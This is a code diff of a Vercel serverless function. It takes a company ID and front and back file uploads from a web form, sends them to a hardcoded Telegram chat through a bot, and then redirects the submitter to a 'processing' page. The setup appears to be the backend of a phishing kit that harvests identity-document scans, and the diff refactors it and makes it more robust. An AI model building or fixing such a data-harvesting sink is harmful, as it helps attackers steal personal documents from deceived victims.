@@ -1,24 +1,22 @@
-import formidable from 'formidable';
-import axios from 'axios';
-import FormData from 'form-data'; // Use the imported 'form-data' package
-import * as fs from 'fs';       // Use standard file system module
+// Use 'require' for internal Node modules for maximum Vercel compatibility
+const fs = require('fs');
+const FormData = require('form-data');
+const formidable = require('formidable');
+const axios = require('axios');
 
 // NOTE: Set your Telegram Bot Token as a Vercel Environment Variable 
-// (Settings -> Environment Variables) named 'TELEGRAM_BOT_TOKEN'
-// This keeps your secret token out of the public code.
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
-const CHAT_ID = '8483934112'; // Your fixed chat ID
+const CHAT_ID = '8483934112'; 
 
-// IMPORTANT: Vercel serverless functions need the exports.default format
+// IMPORTANT: Vercel serverless functions exports format
 export default async function handler(req, res) {
     if (req.method !== 'POST') {
         return res.status(405).send('Method Not Allowed');
     }
     
-    // Check if token is available
     if (!BOT_TOKEN) {
         console.error("TELEGRAM_BOT_TOKEN environment variable is not set!");
-        return res.status(500).send('Configuration Error');
+        return res.status(500).send('Configuration Error: Missing Bot Token');
     }
 
     const form = formidable({});
@@ -27,14 +25,21 @@ export default async function handler(req, res) {
     let files;
     
     try {
-        // Parse the multipart form data
-        [fields, files] = await form.parse(req);
+        [fields, files] = await new Promise((resolve, reject) => {
+            form.parse(req, (err, fields, files) => {
+                if (err) {
+                    reject(err);
+                } else {
+                    resolve([fields, files]);
+                }
+            });
+        });
     } catch (err) {
         console.error('Formidable Parse Error:', err);
         return res.status(500).send('File Upload Processing Failed');
     }
 
-    // Convert fields from array (formidable behavior) to string
+    // Adapt fields to simple string values
     const companyId = fields.companyId ? fields.companyId[0] : '';
     const frontFile = files.frontUpload ? files.frontUpload[0] : null;
     const backFile = files.backUpload ? files.backUpload[0] : null;
@@ -46,10 +51,14 @@ export default async function handler(req, res) {
         const formData = new FormData();
         formData.append('chat_id', chatId);
         
-        // Use fs.createReadStream for large file handling
+        // Ensure the file exists before creating a stream
+        if (!fs.existsSync(file.filepath)) {
+             console.error(`File path does not exist: ${file.filepath}`);
+             return;
+        }
+
         const fileStream = fs.createReadStream(file.filepath);
         
-        // Append the file stream with correct metadata
         formData.append('document', fileStream, {
             filename: file.originalFilename,
             contentType: file.mimetype,
@@ -59,11 +68,10 @@ export default async function handler(req, res) {
         
         try {
             await axios.post(url, formData, {
-                // IMPORTANT: Use getHeaders() from form-data for correct boundary
                 headers: formData.getHeaders(),
             });
         } catch (error) {
-            console.error('Telegram Send Document Error:', error.response ? error.response.data : error.message);
+            console.error('Telegram Send Document Error:', error.response?.data || error.message);
         }
     }
     
@@ -76,25 +84,21 @@ export default async function handler(req, res) {
                 text: text,
             });
         } catch (error) {
-            console.error('Telegram Send Message Error:', error.response ? error.response.data : error.message);
+            console.error('Telegram Send Message Error:', error.response?.data || error.message);
         }
     }
 
-    // 3. Execution
-    
-    // Send company ID message
+    // 4. Execution
     if (companyId) {
         await sendMessage(CHAT_ID, `📌 New Submission\nCompany ID: ${companyId}`);
     }
 
-    // Send files
     await sendDocument(CHAT_ID, frontFile);
     await sendDocument(CHAT_ID, backFile);
     
-    // Send final confirmation
     await sendMessage(CHAT_ID, "✅ All files and data received successfully.");
 
-    // 4. Redirect the user
+    // 5. Redirect the user
     res.setHeader('Location', '/processing.html');
     res.status(302).end();
 }
